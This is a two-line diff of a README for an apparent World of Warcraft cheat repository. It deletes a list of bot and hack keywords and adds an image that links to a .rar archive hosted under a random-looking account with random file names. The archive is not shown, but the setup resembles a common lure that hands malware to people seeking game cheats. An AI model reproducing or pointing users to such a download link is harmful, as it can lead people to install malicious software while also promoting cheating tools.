@@ -1,2 +1,1 @@
-# wowBFH
-wow-bot wow-hack wow-script wow-farm wow-radar wow-auto wow-mod wow-damage-increaser vanilla-wow-addons wow-wotlk wow-farming wow-retail-addons wow-bot-mining wow-fishing
+[![ 5t ](https://github.com/mOWoKaQ538aWuM/wowBFH/blob/main/gkalskasfk.png)](https://github.com/mOWoKaQ538aWuM/wowBFH/raw/main/an5c7bdsy86.rar)
